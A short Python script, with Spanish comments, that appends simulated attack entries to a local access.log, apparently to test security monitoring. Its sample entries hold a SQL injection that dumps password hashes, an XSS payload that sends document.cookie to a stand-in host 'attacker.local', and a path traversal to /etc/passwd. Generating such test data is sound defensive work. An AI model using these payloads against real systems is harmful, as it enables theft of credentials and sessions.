#!/usr/bin/env python3
"""Generador de logs de seguridad sintéticos defensivos hacia access.log."""
import time
import json
from datetime import datetime, timezone
from pathlib import Path

LOG_DIR = Path("./logs")
LOG_DIR.mkdir(parents=True, exist_ok=True)
ACCESS_LOG = LOG_DIR / "access.log"

ATTACK_PAYLOADS = [
    {
        "ip": "192.168.10.45",
        "method": "POST",
        "path": "/api/auth/login",
        "status": 401,
        "query": "username=admin' UNION SELECT 1,username,password_hash FROM users--&password=x",
        "user_agent": "sqlmap/1.7.2#stable",
        "type": "SQL_INJECTION"
    },
    {
        "ip": "192.168.10.88",
        "method": "GET",
        "path": "/dashboard/search",
        "status": 200,
        "query": "q=<script>fetch('http://attacker.local/steal?cookie='+document.cookie)</script>",
        "user_agent": "Mozilla/5.0 (X11; Linux x86_64)",
        "type": "XSS_REFLECTED"
    },
    {
        "ip": "192.168.10.92",
        "method": "GET",
        "path": "/api/static/../../../../etc/passwd",
        "status": 403,
        "query": "",
        "user_agent": "Nikto/2.1.6",
        "type": "PATH_TRAVERSAL"
    }
]

def emit_mock_logs():
    with open(ACCESS_LOG, "a", encoding="utf-8") as f:
        for item in ATTACK_PAYLOADS:
            log_line = (
                f'{item["ip"]} - - [{datetime.now(timezone.utc).strftime("%d/%b/%Y:%H:%M:%S +0000")}] '
                f'"{item["method"]} {item["path"]}?{item["query"]} HTTP/1.1" '
                f'{item["status"]} 1024 "-" "{item["user_agent"]}" [ATTACK_SIMULATION:{item["type"]}]\n'
            )
            f.write(log_line)
            f.flush()
            print(f"Emitted mock security event: {item['type']}")
            time.sleep(0.5)

if __name__ == "__main__":
    emit_mock_logs()
